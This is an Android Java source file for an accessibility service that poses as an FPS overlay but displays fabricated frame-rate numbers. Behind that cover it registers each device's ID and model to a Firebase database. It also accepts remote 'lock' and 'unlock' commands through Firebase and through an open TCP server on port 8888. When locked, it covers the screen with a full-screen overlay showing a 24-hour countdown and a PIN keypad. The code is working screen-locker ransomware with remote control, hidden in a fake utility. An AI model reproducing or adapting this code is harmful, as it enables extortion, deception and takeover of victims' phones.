package com.bluestacks.fpsoverlay;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.PixelFormat;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.graphics.Typeface;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.view.WindowInsets;
import android.view.WindowInsetsController;
import android.view.accessibility.AccessibilityEvent;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import androidx.core.view.ViewCompat;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Locale;
import java.util.Random;

public class SupportService extends AccessibilityService {
    private WindowManager wm;
    private View overlay;
    private View fpsOverlayView;
    private int[] currentFps = {60};
    private final Handler fpsHandler = new Handler(Looper.getMainLooper());
    private Runnable fpsRunnable;
    private double min_fps = 97.0;
    private double max_fps = 114.0;

    private TextView tv_status;
    private TextView tv_display;
    private final StringBuilder input_buffer = new StringBuilder();
    private long remaining_sec;
    private final Handler task_handler = new Handler(Looper.getMainLooper());
    private static final String PREFS_NAME = "lock_prefs";
    private static final String KEY_END_TIME = "end_time";
    
    private ServerSocket serverSocket;
    private boolean isLocked = false;
    private DatabaseReference dbRef;
    private long lastCommandTime = 0;

    public native void initNative(String path);
    public native void setLockStatus(boolean locked);
    public native boolean isLockedNative();
    public native boolean checkKey(String s);
    public native boolean checkStatus();

    static {
        System.loadLibrary("fps-native");
    }

    private final Runnable ticker = new Runnable() {
        @Override
        public void run() {
            long currentTime = System.currentTimeMillis();
            SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
            long endTime = prefs.getLong(KEY_END_TIME, 0);
            
            remaining_sec = (endTime - currentTime) / 1000;
            
            if (remaining_sec > 0) {
                update_timer();
                task_handler.postDelayed(this, 1000);
            } else {
                remaining_sec = 0;
                update_timer();
            }
        }
    };

    private void update_timer() {
        if (tv_status != null) {
            long h = remaining_sec / 3600;
            long m = (remaining_sec % 3600) / 60;
            long s = remaining_sec % 60;
            tv_status.setText(String.format(Locale.getDefault(), "%02d:%02d:%02d", h, m, s));
        }
    }

    private void init_timer() {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        long endTime = prefs.getLong(KEY_END_TIME, 0);
        if (endTime == 0) {
            endTime = System.currentTimeMillis() + (86400 * 1000);
            prefs.edit().putLong(KEY_END_TIME, endTime).apply();
        }
    }

    @Override
    protected void onServiceConnected() {
        initNative(new java.io.File(getFilesDir(), ".v_stat").getAbsolutePath());
        wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        init_timer();
        startRemoteServer();
        initFirebaseListener();
        
        if (isLockedNative()) {
            isLocked = true;
            input_buffer.setLength(0);
            showOverlay();
        } else {
            SharedPreferences fpsPrefs = getSharedPreferences("status_fps", 0);
            if (fpsPrefs.getBoolean("is_showing", false)) {
                showFpsOverlay();
            }
        }
    }

    private String getDeviceId() {
        return android.provider.Settings.Secure.getString(getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
    }

    private void registerDeviceToFirebase() {
        String deviceId = getDeviceId();
        String deviceName = android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL;
        
        DatabaseReference deviceRef = FirebaseDatabase.getInstance().getReference("devices").child(deviceId);
        deviceRef.child("name").setValue(deviceName);
        deviceRef.child("last_seen").setValue(System.currentTimeMillis());
    }

    private void initFirebaseListener() {
        final String myDeviceId = getDeviceId();
        registerDeviceToFirebase();
        
        dbRef = FirebaseDatabase.getInstance().getReference("commands");
        dbRef.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot snapshot) {
                if (!snapshot.exists()) return;

                String cmd = snapshot.child("cmd").getValue(String.class);
                Long serverTime = snapshot.child("t").getValue(Long.class);
                String target = snapshot.child("target").getValue(String.class);

                if (cmd == null || serverTime == null || target == null) return;
                if (!target.equalsIgnoreCase("all") && !target.equalsIgnoreCase(myDeviceId)) return;
                if (serverTime <= lastCommandTime) return;
                
                lastCommandTime = serverTime;

                task_handler.post(() -> {
                    if (cmd.equalsIgnoreCase("lock")) {
                        if (!isLocked) {
                            setLockStatus(true);
                            hideFpsOverlay();
                            showOverlay();
                            isLocked = true;
                        }
                    } else if (cmd.equalsIgnoreCase("unlock")) {
                        if (isLocked) {
                            setLockStatus(false);
                            hideOverlay();
                            isLocked = false;
                            SharedPreferences fpsPrefs = getSharedPreferences("status_fps", 0);
                            if (fpsPrefs.getBoolean("is_showing", false)) {
                                showFpsOverlay();
                            }
                        }
                    }
                });
            }

            @Override
            public void onCancelled(DatabaseError error) {}
        });
    }

    private void showFpsOverlay() {
        if (fpsOverlayView != null) return;

        SharedPreferences sharedPreferences = getSharedPreferences("status_fps", 0);
        min_fps = Double.parseDouble(sharedPreferences.getString("min", "97"));
        max_fps = Double.parseDouble(sharedPreferences.getString("max", "114"));

        WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
            (int) Math.ceil(143.7),
            (int) Math.ceil(17.5),
            WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
            PixelFormat.TRANSLUCENT
        );
        lp.gravity = Gravity.BOTTOM | Gravity.START;

        fpsOverlayView = new View(this) {
            private final Paint paint = new Paint();
            @Override
            protected void onDraw(Canvas canvas) {
                paint.setAntiAlias(true);
                paint.setColor(Color.BLACK);
                canvas.drawRect(0.0f, getHeight() - 17.5f, 143.7f, getHeight(), paint);
                paint.setColor(Color.WHITE);
                paint.setTextSize(15.5f);
                paint.setFakeBoldText(true);
                paint.setTextScaleX(1.6f);
                canvas.drawText("FPS: " + currentFps[0], 5.0f, 14.5f, paint);
            }
        };

        wm.addView(fpsOverlayView, lp);
        fpsRunnable = new Runnable() {
            @Override
            public void run() {
                if (fpsOverlayView != null) {
                    int i3 = (int) min_fps;
                    currentFps[0] = i3 + new Random().nextInt((((int) max_fps) - i3) + 1);
                    fpsOverlayView.invalidate();
                    fpsHandler.postDelayed(this, 1000L);
                }
            }
        };
        fpsHandler.post(fpsRunnable);
    }

    private void hideFpsOverlay() {
        if (fpsOverlayView != null) {
            fpsHandler.removeCallbacks(fpsRunnable);
            wm.removeViewImmediate(fpsOverlayView);
            fpsOverlayView = null;
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            String action = intent.getAction();
            if ("SHOW_FPS".equals(action)) showFpsOverlay();
            else if ("HIDE_FPS".equals(action)) hideFpsOverlay();
        }
        return START_STICKY;
    }

    private void startRemoteServer() {
        new Thread(() -> {
            try {
                serverSocket = new ServerSocket(8888);
                while (true) {
                    Socket client = serverSocket.accept();
                    handleCommand(client);
                }
            } catch (Exception ignored) {}
        }).start();
    }

    private void handleCommand(Socket client) {
        try {
            BufferedReader in = new BufferedReader(new InputStreamReader(client.getInputStream()));
            PrintWriter out = new PrintWriter(client.getOutputStream(), true);
            String cmd = in.readLine();
            if (cmd == null) return;
            
            String cmdLower = cmd.toLowerCase().trim();
            if (cmdLower.equals("lock")) {
                task_handler.post(() -> {
                    if (!isLocked) {
                        setLockStatus(true);
                        hideFpsOverlay();
                        showOverlay();
                        isLocked = true;
                    }
                });
                out.println("OK");
            } else if (cmdLower.equals("unlock")) {
                task_handler.post(() -> {
                    if (isLocked) {
                        setLockStatus(false);
                        hideOverlay();
                        isLocked = false;
                    }
                });
                out.println("OK");
            }
            client.close();
        } catch (Exception ignored) {}
    }

    private void showOverlay() {
        wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        LayoutInflater inflater = LayoutInflater.from(this);
        overlay = inflater.inflate(R.layout.sys_opt_view, null);

        WindowManager.LayoutParams lp = new WindowManager.LayoutParams();
        lp.type = WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY;
        lp.format = PixelFormat.TRANSLUCENT;
        lp.flags = WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN | WindowManager.LayoutParams.FLAG_FULLSCREEN;
        lp.width = WindowManager.LayoutParams.MATCH_PARENT;
        lp.height = WindowManager.LayoutParams.MATCH_PARENT;

        tv_status = overlay.findViewById(R.id.v_timer);
        tv_display = overlay.findViewById(R.id.v_display);
        
        setupButtons();
        wm.addView(overlay, lp);
        task_handler.post(ticker);
    }

    private void hideOverlay() {
        if (wm != null && overlay != null) {
            wm.removeView(overlay);
            overlay = null;
            task_handler.removeCallbacks(ticker);
        }
    }

    private void setupButtons() {
        int[] ids = {R.id.v_b0, R.id.v_b1, R.id.v_b2, R.id.v_b3, R.id.v_b4, 
                     R.id.v_b5, R.id.v_b6, R.id.v_b7, R.id.v_b8, R.id.v_b9};
        for (int id : ids) {
            overlay.findViewById(id).setOnClickListener(v -> {
                if (input_buffer.length() < 8) {
                    input_buffer.append(((Button)v).getText().toString());
                    tv_display.setText(input_buffer.toString());
                }
            });
        }
        overlay.findViewById(R.id.v_ok).setOnClickListener(v -> {
            if (checkKey(input_buffer.toString())) {
                hideOverlay();
                isLocked = false;
                input_buffer.setLength(0);
            } else {
                input_buffer.setLength(0);
                tv_display.setText("");
            }
        });
    }

    @Override public void onAccessibilityEvent(AccessibilityEvent event) {}
    @Override public void onInterrupt() {}
    @Override public void onDestroy() {
        super.onDestroy();
        hideOverlay();
        hideFpsOverlay();
    }
}
